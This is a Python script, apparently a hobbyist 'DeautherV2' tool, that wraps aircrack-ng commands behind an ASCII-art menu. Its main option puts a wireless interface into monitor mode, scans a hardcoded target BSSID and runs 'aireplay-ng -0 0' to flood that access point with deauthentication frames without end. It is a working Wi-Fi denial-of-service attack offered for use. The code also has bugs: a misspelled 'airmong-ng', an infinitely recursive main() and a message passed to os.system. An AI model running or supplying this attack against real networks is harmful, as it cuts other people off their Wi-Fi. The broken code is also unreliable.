#!bin/python

import os, sys, time
import random

# Color Text
green   =   "\033[1;92m"
white   =   "\033[1;97m"
ash     =   "\033[1;90m"
yellow  =   "\033[1;93m"
purple  =   "\033[1;95m"
red     =   "\033[1;91m"
blue    =   "\033[1;96m"

def main():
   try:
    main()
   except KeyboardInterrupt:
    textwalk(f"""{red}Cancel
{green}Bye...!!!""")
    sys.exit()

def textwalk(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)

# Main Menu
def menu():
    time.sleep(3)
    os.system("clear")
    textwalk(f"{red}Hello welcome DeautherV2\n{green}don't forget do not exaggerate{red}\nThank You...!!!")
    time.sleep(3)
    os.system("clear")
    time.sleep(3)
    print(f"""
{ash}Please Choose Number Two First To Paste The {red}MAC Targeter
{ash}Then Determine The Wifi Adapter Interface For {red}Example: wlan0/wlan1
{ash}@@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@
{ash}@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@
{ash}@@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@
{ash}!@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@
{ash}@!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!
{ash}!@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!
{red}!!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!
{red}:!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!
{red}:::: ::   :: ::::   ::   :::  ::::: ::    :::    :::  :::  :: ::::   :::   :::
{red}:: : :    :: ::::   ::   : :   : :: ::     :      :   : :  : :: ::   ::     :::""")
    print("")
    print(f"{red}******************************")
    print(f"{red}* [ Manual Code Deauther   ] *")
    print(f"{red}* [ Author : Deauther Test ] *")
    print(f"{red}* [ Deauther : 1           ] *")
    print(f"{red}* [ Edit Deauther : 2      ] *")
    print(f"{red}* [ Exit   : 0             ] *")
    print(f"{red}******************************")
    time.sleep(2)

# Input Menu
    tools = input(f"""{red}Select Number ==>> """)

# Output Menu
    if tools=="1":
       os.system("clear")
       time.sleep(3)
       os.system("clear")
       print("Check Interface Wlan")
       time.sleep(4)
       os.system("iwconfig")
       os.system("airmon-ng stop wlan0")
       os.system("airmong-ng start wlan0")
       os.system("airodump-ng wlan0")
       os.system("airodump-ng -c 1 --bssid E4:8D:8C:D7:C4:C6 wlan0") # Paste Here Mac Target
       os.system("aireplay-ng -0 0 -a E4:8D:8C:D7:C4:C6 wlan0") # Paste Here Mac Target

    elif tools=="2":
       os.system("clear")
       time.sleep(3)
       os.system("nano Deauther.py")

    elif tools=="0":
       os.system("clear")
       time.sleep(3)
       print(f"{green}Thank You...{red} see you again:)")
       time.sleep(2)
       sys.exit()

    else:
       time.sleep(3)
       os.system("clear")
       os.system(f"{red}Input Code Not Valid...{green} Pls Input Code Valid.")
       time.sleep(3)
       os.system("python deauther.py")

menu()
